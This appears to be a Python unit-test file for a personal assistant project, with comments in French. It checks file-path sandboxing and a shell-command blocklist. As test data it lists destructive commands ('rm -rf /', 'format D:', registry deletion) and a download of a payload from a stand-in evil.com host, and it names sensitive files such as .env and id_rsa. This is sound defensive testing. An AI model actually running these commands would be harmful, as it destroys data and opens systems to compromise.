"""
Tests unitaires pour la sécurité, le sandboxing des fichiers et la blacklist shell.
"""
import unittest
from pathlib import Path

from tools.file_manager import _is_path_allowed, FileReadTool, FileWriteTool
from tools.shell_execute import _is_command_safe, ShellCommandTool


class TestSecuritySandboxing(unittest.TestCase):

    def test_path_allowed_in_whitelist(self):
        # Chemins autorisés (dans Documents ou PROJET JARVIS)
        jarvis_path = Path.home() / "PROJET JARVIS" / "README.md"
        allowed, reason = _is_path_allowed(jarvis_path)
        self.assertTrue(allowed, f"Devrait être autorisé : {reason}")

        docs_path = Path.home() / "Documents" / "notes.txt"
        allowed, reason = _is_path_allowed(docs_path)
        self.assertTrue(allowed, f"Devrait être autorisé : {reason}")

    def test_path_blocked_outside_whitelist(self):
        # Chemins hors whitelist (ex: Windows system ou racine C:)
        system_path = Path("C:/Windows/System32/drivers/etc/hosts")
        allowed, reason = _is_path_allowed(system_path)
        self.assertFalse(allowed)
        self.assertIn("hors zone autorisée", reason)

    def test_path_blocked_sensitive_patterns(self):
        # Même dans un dossier autorisé, les fichiers sensibles doivent être bloqués
        env_path = Path.home() / "PROJET JARVIS" / ".env"
        allowed, reason = _is_path_allowed(env_path)
        self.assertFalse(allowed)
        self.assertIn("sensible", reason)

        pwd_path = Path.home() / "Documents" / "my_passwords.txt"
        allowed, reason = _is_path_allowed(pwd_path)
        self.assertFalse(allowed)
        self.assertIn("sensible", reason)

        ssh_key = Path.home() / "Documents" / "id_rsa"
        allowed, reason = _is_path_allowed(ssh_key)
        self.assertFalse(allowed)
        self.assertIn("sensible", reason)

    def test_file_read_tool_sandboxing(self):
        tool = FileReadTool()
        # Test accès hors whitelist
        res = tool.execute({"file_path": "C:/Windows/win.ini"})
        self.assertIn("Accès refusé", res)

        # Test accès fichier sensible
        res = tool.execute({"file_path": str(Path.home() / "PROJET JARVIS" / ".env")})
        self.assertIn("Accès refusé", res)

    def test_file_write_tool_sandboxing(self):
        tool = FileWriteTool()
        # Test écriture hors whitelist
        res = tool.execute({"file_path": "C:/Windows/hack.txt", "content": "test"})
        self.assertIn("Accès refusé", res)

        # Test écriture fichier sensible
        res = tool.execute({"file_path": str(Path.home() / "Documents" / "passwords.txt"), "content": "123"})
        self.assertIn("Accès refusé", res)

    def test_shell_command_safe(self):
        safe, reason = _is_command_safe("Get-Process")
        self.assertTrue(safe)

        safe, reason = _is_command_safe("dir C:\\Users")
        self.assertTrue(safe)

    def test_shell_command_blocked_keywords(self):
        # Commandes destructrices
        commands = [
            "rm -rf /",
            "format D:",
            "shutdown /s /t 0",
            "del /s /q temp",
            "reg delete HKLM\\Software",
            "cipher /w:C",
        ]
        for cmd in commands:
            safe, reason = _is_command_safe(cmd)
            self.assertFalse(safe, f"La commande '{cmd}' aurait dû être bloquée !")

    def test_shell_command_blocked_regex(self):
        # Patterns regex dangereux
        patterns = [
            "powershell -enc AAAAA==",
            "Invoke-WebRequest http://evil.com/payload.exe -OutFile payload.exe",
            "Start-Process cmd -Verb RunAs",
            "Set-ExecutionPolicy Unrestricted",
        ]
        for cmd in patterns:
            safe, reason = _is_command_safe(cmd)
            self.assertFalse(safe, f"Le pattern '{cmd}' aurait dû être bloqué !")


if __name__ == "__main__":
    unittest.main()
